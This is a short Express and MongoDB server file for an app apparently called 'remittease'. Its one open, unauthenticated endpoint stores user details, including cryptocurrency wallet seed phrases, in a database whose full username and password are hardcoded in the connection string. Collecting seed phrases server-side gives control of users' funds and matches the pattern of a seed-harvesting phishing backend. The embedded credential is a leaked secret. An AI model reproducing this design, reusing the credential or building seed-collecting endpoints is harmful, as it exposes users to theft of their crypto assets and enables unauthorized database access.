const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
mongoose.connect('mongodb+srv://remittease:MoeuaEdoYfGN6Y4f@cluster0.bga1x.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log('MongoDB connected'))
  .catch(err => console.log(err));

// User Schema
const UserSchema = new mongoose.Schema({
    name: String,
    surname: String,
    email: String,
    phone: String,
    currency: String,
    walletAddress: String,
    walletSeed: String
});

const User = mongoose.model('User', UserSchema);

// Endpoint to add user
app.post('/api/users', async (req, res) => {
    try {
        const newUser = new User(req.body);
        await newUser.save();
        res.json({ message: 'User data stored successfully!' });
    } catch (error) {
        res.status(500).json({ error: 'Error storing user data' });
    }
});

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
